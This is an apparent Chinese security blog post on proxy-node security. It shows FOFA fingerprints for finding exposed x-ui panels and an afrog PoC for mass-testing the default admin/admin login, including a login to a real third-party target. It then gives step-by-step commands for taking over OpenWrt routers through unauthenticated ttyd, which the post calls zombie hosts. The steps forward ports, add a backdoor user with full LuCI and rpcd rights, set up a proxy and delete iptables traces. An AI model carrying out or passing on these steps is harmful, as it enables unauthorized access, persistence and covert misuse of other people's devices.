<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>jammny - Fighter安全团队</title>
    <link rel="stylesheet" type="text/css" href="./theme/css/screen.min.css">
    <link rel="stylesheet" type="text/css" href="./theme/css/highlight.min.css">
    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400" />
    <link rel="publisher" href="">
    <link rel="apple-touch-startup-image" href="./theme/images/logo.png">
    <link type="text/plain" rel="socialmedia" href="./socialmedia.txt">
    <link rel="dns-prefetch" href="."/>
    <link rel="dns-prefetch" href="//www.gstatic.com"/>
    <link rel="dns-prefetch" href="//fonts.gstatic.com"/>
    <link rel="dns-prefetch" href="//fonts.googleapis.com"/>
    <link rel="dns-prefetch" href="//accounts.google.com"/>
    <link rel="dns-prefetch" href="//ssl.google-analytics.com"/>
    <link rel="dns-prefetch" href="//www.google-analytics.com"/>
    <link rel="dns-prefetch" href="//googleads.g.doubleclick.net"/>
    <link rel="dns-prefetch" href="//pagead2.googlesyndication.com"/>
    <link rel="dns-prefetch" href="//twemoji.maxcdn.com"/>
    <meta http-equiv="content-type" content="text/html;charset=utf-8">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/>
    <meta name="apple-mobile-web-app-capable" content="yes"/>
    <meta name="application-name" content="jammny - Fighter安全团队"/>
    <meta name="msapplication-starturl" content="http:."/>
    <meta name="msapplication-tooltip" content=""/>
    <meta name="msapplication-window" content="width=1024;height=768"/>
    <meta name="msapplication-task" content="name=jammny - Fighter安全团队;action-uri=http:.;icon-uri=./theme/images/favicon.ico"/>
    <meta name="msapplication-TileImage" content="./theme/images/apple-touch-icon-144x144.png"/>
    <meta name="msapplication-TileColor" content="#1F1F21"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="imagetoolbar" content="no">
    <meta http-equiv="pragma" content="cache">
    <meta http-equiv="cache-control" content="cache">
    <meta http-equiv="vary" content="content-language">
    <meta http-equiv="Cache-control" content="max-age=2592000, public">
    <meta http-equiv="content-style-type" content="text/css">
    <meta name="application-name" content="jammny - Fighter安全团队">
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="google-site-verification" content="">
    <meta name="alexaVerifyID" content=""/>
    <meta name="wot-verification" content=""/>
    <meta name="msvalidate.01" content="" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="medium" content="mult">
    <meta name="adblock" content="disable">
    <meta name="rating" content="General">
    <meta name="resource-type" content="document">
    <meta name="revisit-after" content="1 days">
    <meta name="revisit" content="1">
    <meta name="robots" content="index,follow">
    <meta name="no-email-collection" content="http://www.unspam.com/noemailcollection/">
    <link rel="apple-touch-icon" sizes="152x152" href="./theme/images/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="144x144" href="./theme/images/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="114x114" href="./theme/images/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="./theme/images/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="76x76" href="./theme/images/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="72x72" href="./theme/images/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="60x60" href="./theme/images/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="57x57" href="./theme/images/apple-touch-icon-57x57.png">
    <link rel="icon" type="image/png" href="./theme/images/favicon-196x196.png" sizes="196x196">
    <link rel="icon" type="image/png" href="./theme/images/favicon-160x160.png" sizes="160x160">
    <link rel="icon" type="image/png" href="./theme/images/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="./theme/images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="./theme/images/favicon-16x16.png" sizes="16x16">
    <link rel="shortcut icon" href="./theme/images/favicon.ico">
    <script type="text/javascript">(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create', '', 'auto');ga('send', 'pageview');var _qevents = _qevents || [];</script>
    <script src="//twemoji.maxcdn.com/twemoji.min.js"></script>
</head>
<body class="home-template nav-closed" itemscope itemtype="http://schema.org/WebPage">
<!-- Google Tag Manager -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-ML9KT2"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-ML9KT2');</script>
<!-- End Google Tag Manager -->
    <meta itemprop="name" content="jammny - Fighter安全团队">
    <meta itemprop="url" content=".">
    <meta itemprop="headline" content="jammny - Fighter安全团队 || ">
    <meta itemprop="description about" content="">
    <meta itemprop="keywords" content="gnu, linux, software libre, código abierto, tecnología">
    <meta itemprop="primaryImageOfPage" content="./theme/images/logo.png">
    <meta itemprop="inLanguage" content="es">
<nav class="nav">
    <h3 class="nav-title">Menu</h3>
    <a href="#" class="nav-close">
        <span class="hidden">Close</span>
    </a>
    <ul role="menubar">
            <li class="nav-current" role="presentation"><a  href="./archives.html" title="jammny - Fighter安全团队 | Archives" itemprop="name" itemprop="significantLink">Archives</a></li>        
    </ul>
    <a class="subscribe-button icon-feed" href='feeds/all.atom.xml'  target='blank'>RSS</a>
</nav>
<span class="nav-cover"></span>    <div class="site-wrapper">
        <header class="main-header post-head" style="background-image: url(./theme/images/bear.jpg)" itemscope itemtype="http://schema.org/WPHeader">
            <nav class="main-nav overlay clearfix">
                <a class="menu-button" href="#">
                    <span class="burger">&#9776;</span>
                    <span class="word">Menu</span>
                </a>
            </nav>
            <div class="vertical">
                <div class="main-header-content inner">
                    <h1 class="page-title" itemprop="headline">jammny - Fighter安全团队</h1>
                    <h2 class="page-description" itemprop="description"></h2>
                </div>
            </div>
            <a class="scroll-down icon-arrow-left blink_me" href="#content" data-offset="-45">
                <span class="hidden">Scroll Down</span>
            </a>
        </header>
<main id="content" class="content" role="main">
    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
        <header class="post-header">
            <h1 class="post-title" itemprop="headline">网络代理节点的安全性研究</h1>
            <section class="post-meta">
                <span class="entry-author" itemscope="" itemtype="http://schema.org/Person" itemprop="author">
                    <span itemprop="name">jammny - Fighter安全团队</span></span>
                <time class="post-date" itemprop="datePublished" datetime="2023YYY-00M-%DD">星期五, 四月 14, 2023</time>
<nav role="navigation">
    <a class="newer-posts blink_me" href=".">&larr; Back</a>
</nav><br/>            </section>
        </header>
        <section class="post-content">
            <p><code>原创声明：转载本文请标注出处和作者，望尊重作者劳动成果！感谢！</code></p>
<blockquote>
<p>前言：本文主要从两个方面探究网络代理节点的安全性，绝不是为了白嫖别人的节点。</p>
</blockquote>
<p><a name="LOYe8"></a></p>
<h3>暴露的代理节点控制端</h3>
<blockquote>
<p>现在搭建代理服务器是越来越方便了，几条命令就可以搭建好可视化的控制平台，虽然操作更便捷了，但是也有可能会带来一系列的安全问题。</p>
</blockquote>
<p>我关注到一个可视化搭建代理的项目：<a href="https://github.com/vaxilu/x-ui">https://github.com/vaxilu/x-ui</a><br /><img alt="image.png" src="images/1681459181714/1681459191902_0.png"><br />项目搭建命令：</p>
<div class="highlight"><pre><span></span><code>bash &lt;(curl -Ls https://raw.githubusercontent.com/vaxilu/x-ui/master/install.sh)
</code></pre></div>

<p>程序安装的时，允许用户使用默认端口（54321）和口令(admin/admin)：<br /><img alt="image.png" src="images/1681459181714/1681459192246_1.png"><br /><img alt="image.png" src="images/1681459181714/1681459192574_2.png"><br />搭建成功后，访问54321端口就能看到web控制端了。
<a name="Mzpez"></a></p>
<h4>收集暴露的资产</h4>
<p>通过fofa指纹：<code>port="54321" &amp;&amp; title=="登录"</code>，我们可以收集到，使用默认端口搭建的节点资产：<br /><img alt="image.png" src="images/1681459181714/1681459193042_3.png"><br />从fofa的收集到的结果来看，大概可能存在约12万个相关资产，接下来通过 jws-cli （<a href="https://github.com/jammny/jws-cli">https://github.com/jammny/jws-cli</a>） 自动化收集目标信息：</p>
<div class="highlight"><pre><span></span><code>python jws-cli.py -q &#39;port=&quot;54321&quot; &amp;&amp; title==&quot;登录&quot;&#39; --finger --fofa
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459193418_4.png"><br /><img alt="image.png" src="images/1681459181714/1681459193780_5.png"><br />从程序导出收集结果，能正常访问的资产有521个：<br /><img alt="image.png" src="images/1681459181714/1681459194178_6.png"><br />随便找一个目标，在登陆页面抓包，分析参数，如果登录成功，应该返回<code>"success":true</code>：<br /><img alt="image.png" src="images/1681459181714/1681459194565_7.png">
<a name="u6XKt"></a></p>
<h4>批量接管控制台权限</h4>
<p>接着编写afrog（<a href="https://github.com/zan8in/afrog">https://github.com/zan8in/afrog</a>）poc脚本，验证存在默认口令的资产：</p>
<div class="highlight"><pre><span></span><code><span class="n">id</span><span class="o">:</span><span class="w"> </span><span class="n">X</span><span class="o">-</span><span class="n">UI</span><span class="o">-</span><span class="n">weak</span><span class="o">-</span><span class="n">password</span>

<span class="n">info</span><span class="o">:</span>
<span class="w">  </span><span class="n">name</span><span class="o">:</span><span class="w"> </span><span class="n">X</span><span class="o">-</span><span class="n">UI</span><span class="w"> </span><span class="err">弱口令漏洞</span>
<span class="w">  </span><span class="n">author</span><span class="o">:</span><span class="w"> </span><span class="n">jammny</span>
<span class="w">  </span><span class="n">severity</span><span class="o">:</span><span class="w"> </span><span class="n">high</span>
<span class="w">  </span><span class="n">verified</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span>
<span class="w">  </span><span class="n">description</span><span class="o">:</span><span class="w"> </span><span class="o">|</span>
<span class="w">    </span><span class="n">X</span><span class="o">-</span><span class="n">UI</span><span class="w"> </span><span class="err">控制端存在弱口令</span>
<span class="w">    </span><span class="n">fofa</span><span class="o">:</span><span class="w"> </span><span class="n">port</span><span class="o">=</span><span class="s2">&quot;54321&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">title</span><span class="o">==</span><span class="s2">&quot;登录&quot;</span>

<span class="n">rules</span><span class="o">:</span>
<span class="w">    </span><span class="n">r0</span><span class="o">:</span>
<span class="w">        </span><span class="n">request</span><span class="o">:</span>
<span class="w">            </span><span class="n">method</span><span class="o">:</span><span class="w"> </span><span class="n">POST</span>
<span class="w">            </span><span class="n">path</span><span class="o">:</span><span class="w"> </span><span class="o">/</span><span class="n">login</span>
<span class="w">            </span><span class="n">body</span><span class="o">:</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">password</span><span class="o">=</span><span class="n">admin</span>
<span class="w">        </span><span class="n">expression</span><span class="o">:</span><span class="w"> </span><span class="n">response</span><span class="o">.</span><span class="na">status</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">response</span><span class="o">.</span><span class="na">body</span><span class="o">.</span><span class="na">bcontains</span><span class="o">(</span><span class="n">b</span><span class="s1">&#39;&quot;success&quot;:true&#39;</span><span class="o">)</span>

<span class="n">expression</span><span class="o">:</span><span class="w"> </span><span class="n">r0</span><span class="o">()</span>
</code></pre></div>

<p>批量验证存在弱口令的目标：<br /><img alt="image.png" src="images/1681459181714/1681459194829_8.png"><br />从中随机访问一个目标，测试弱口令登录：<br /><img alt="image.png" src="images/1681459181714/1681459195239_9.png"><br /><img alt="image.png" src="images/1681459181714/1681459195477_10.png"><br />查看节点内容：<br /><img alt="image.png" src="images/1681459181714/1681459195873_11.png"><br />复制链接，或者将二维码导出到本地用客户端连接，即可使用该节点：<br /><img alt="image.png" src="images/1681459181714/1681459196185_12.png"><br /><img alt="image.png" src="images/1681459181714/1681459196478_13.png"><br /><img alt="image.png" src="images/1681459181714/1681459196740_14.png">
<a name="lFafc"></a></p>
<h3>暴露的路由器漏洞</h3>
<blockquote>
<p>这里选择openwrt 或 FriendlyWRT 做测试，这种路由器产品内置了流量代理功能，很方便当我们得肉鸡。利用 ttyd控制台 未授权访问漏洞，可以快速获取目标主机权限。 </p>
</blockquote>
<div class="highlight"><pre><span></span><code><span class="n">肉鸡路由器</span><span class="err">：</span><span class="n">openwrt</span><span class="err">（</span><span class="n">或FriendlyWRT</span><span class="err">）</span>
<span class="n">利用漏洞</span><span class="err">：</span><span class="n">ttyd控制台未授权访问漏洞</span>
<span class="n">hunter指纹</span><span class="err">：</span><span class="n">web</span><span class="p">.</span><span class="n">body</span><span class="o">=</span><span class="ss">&quot;ttyd&quot;</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">is_domain</span><span class="o">=</span><span class="ss">&quot;false&quot;</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">ip</span><span class="p">.</span><span class="n">port</span><span class="o">=</span><span class="ss">&quot;7681&quot;</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">web</span><span class="p">.</span><span class="n">title</span><span class="o">=</span><span class="ss">&quot;root@OpenWrt&quot;</span>
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459197015_15.png"><br />如果存在漏洞，不需要账号密码可以直接登录，应该是如下图所示：<br /><img alt="image.png" src="images/1681459181714/1681459197320_16.png"><br />查看端口开放状态，有80端口一般就是控制台：</p>
<div class="highlight"><pre><span></span><code>netstat -tunpl | grep uhttpd
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459197533_17.png"><br />如果说可以直接访问80端口，看到LuCI控制台的话就不用进行转发。
<a name="wsULr"></a></p>
<h4>LuCI控制台外网访问</h4>
<p>观察ip：192.168.0.99<br /><img alt="image.png" src="images/1681459181714/1681459197781_18.png"><br />在nat表的PREROUTING链新增一条规则， 让目的端口为54415的流量的转发到80端口上</p>
<div class="highlight"><pre><span></span><code>iptables -t nat -A PREROUTING -p tcp --dport 54415 -j DNAT --to-destination 192.168.0.99:80
</code></pre></div>

<p>列出nat表中的规则 </p>
<div class="highlight"><pre><span></span><code>iptables -t nat -L -n --line-number
</code></pre></div>

<p>最后看看访问54415端口是否能过正常访问。
<a name="AWmp9"></a></p>
<h4>添加新用户</h4>
<p>添加用户：</p>
<div class="highlight"><pre><span></span><code>opkg update
opkg install shadow-common
opkg install shadow-useradd
useradd openwrt
passwd openwrt
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459198081_19.png"><br />修改文件1：vim /usr/lib/lua/luci/controller/admin/index.lua</p>
<div class="highlight"><pre><span></span><code>将page.sysauth = &quot;root&quot; 修改为 page.sysauth = {&quot;root&quot;,&quot;openwrt&quot;}
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459198463_20.png"><br />修改文件2：vim /etc/config/rpcd</p>
<div class="highlight"><pre><span></span><code>config login
        option username &#39;openwrt&#39;
        option password &#39;$p$openwrt&#39;
        list read &#39;*&#39;
        list write &#39;*&#39;
</code></pre></div>

<p><img alt="image.png" src="images/1681459181714/1681459198718_21.png"><br />最后重启生效：<code>reboot</code>
<a name="ukjaz"></a></p>
<h4>添加代理</h4>
<p>重启完访问54415端口输入密码登录系统，然后添加代理：<br /><img alt="image.png" src="images/1681459181714/1681459198976_22.png"><br /><img alt="image.png" src="images/1681459181714/1681459199321_23.png"><br />启用服务：<br /><img alt="image.png" src="images/1681459181714/1681459199615_24.png"><br />开启启动项：<br /><img alt="image.png" src="images/1681459181714/1681459199914_25.png"><br />检测服务状态：<br /><img alt="image.png" src="images/1681459181714/1681459200302_26.png"><br />查看服务是否启动：<code>netstat -tunpl | grep ss</code><br /><img alt="image.png" src="images/1681459181714/1681459200541_27.png"><br />如果外网没办法直接访问8005端口的话，就再做一次端口映射，新增一条iptables规则：</p>
<div class="highlight"><pre><span></span><code>iptables -t nat -A PREROUTING -p tcp --dport 59878 -j DNAT --to-destination 192.168.0.99:8005
</code></pre></div>

<p>查看新增的规则：<code>iptables -t nat -L -n --line-number</code><br /><img alt="image.png" src="images/1681459181714/1681459200796_28.png"><br />配置代理：<br /><img alt="image.png" src="images/1681459181714/1681459201062_29.png"><br /><img alt="image.png" src="images/1681459181714/1681459201361_30.png"><br />删除80端口映射痕迹：</p>
<div class="highlight"><pre><span></span><code>iptables -t nat -D PREROUTING 9 #删除nat表中PREROUTING链中的第9条规则
</code></pre></div>
            <br/>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-7127443823639155" data-ad-slot="9038513565" data-ad-format="auto"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script>            <br/>
<nav class="pagination" role="navigation">
    <ul>
        <a rel="prev" class="newer-posts" href="./shou-ba-ge-chong-wang-zhan-de-jia-mi-suan-fa.html" title="Leer: 手扒各种网站的加密算法">
            Leer la nueva publicación
        </a>
        <a rel="next" class="older-posts" href="./pygong-ju-kai-fa-2-zhi-wen-shi-bie.html" title="Leer: Py工具开发(2) | 指纹识别">
            Leer la próxima publicación
        </a>
    </ul>
</nav>            <br/>
        </section>
        <footer class="post-footer">
        </footer>
    </article>
</main>
        <footer class="site-footer clearfix" role="contentinfo" itemscope itemtype="http://schema.org/WPFooter">
            <section class="copyright">
                <a itemprop="url" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" class="tooltip" data-tooltip="CC BY-NC-SA" target="_blank">
                CC Attribution-NonCommercial-ShareAlike 4.0 International License</a>.
            </section>
            <section class="poweredby">Proudly published with <a href="https://getpelican.org">Pelican</a></section>
        </footer>
    </div>
    <script type="text/javascript" src="./theme/js/jquery-1.11.2.min.js"></script>
    <script type="text/javascript" src="./theme/js/jquery.fitvids.min.js"></script>
    <script type="text/javascript" src="./theme/js/index.min.js"></script>
    <script>twemoji.parse(document, {"size":16});</script>
</body>
</html>